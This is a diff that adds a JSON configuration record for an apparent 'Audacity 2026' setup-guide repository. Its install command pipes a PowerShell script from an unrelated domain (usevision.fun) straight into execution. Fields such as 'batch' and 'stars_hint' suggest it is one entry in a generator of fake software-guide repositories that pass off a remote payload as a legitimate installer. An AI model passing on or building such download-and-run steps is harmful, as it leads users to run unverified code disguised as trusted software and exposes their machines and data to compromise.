@@ -1,0 +1,12 @@
+{
+  "repo": "Audacity-2026-Desktop-Setup-Guide",
+  "product": "Audacity 2026",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 12,
+  "batch": "new28",
+  "format": "troubleshooting-guide",
+  "category": "utility-software"
+}
